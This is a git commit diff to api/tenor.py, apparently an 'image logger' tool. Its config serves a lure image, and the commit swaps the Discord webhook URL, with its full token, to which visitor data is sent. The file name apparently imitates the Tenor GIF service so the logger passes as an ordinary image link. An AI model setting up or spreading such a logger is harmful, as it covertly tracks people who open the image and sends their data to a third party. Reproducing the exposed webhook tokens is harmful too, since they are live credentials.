6dcf39a9d69eaf1ab27ed709299ea0647e84c082
staffvxdebi-art <staffvxdebi@gmail.com>
2026-01-20 14:03:20 +0400

    Update tenor.py

--- api/tenor.py
+++ api/tenor.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1463102128640757962/i4KkAI3FY7z8iXfD8GoRRORwpRVcVPMb6YS3U0cUReC0xsESvCpaxvK1GHcpbv4Lv57B",
+    "webhook": "https://discord.com/api/webhooks/1463111448879435806/6fsxqTdVYSTV09acJpSx3xo_VE30XE1Hc8Q2f71wl1YXUO_qc_EYwHmwJEV1dq43BgTW",
     "image": "https://i1.sndcdn.com/artworks-mn15a6UuT3K6JESS-mv5hQA-t1080x1080.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
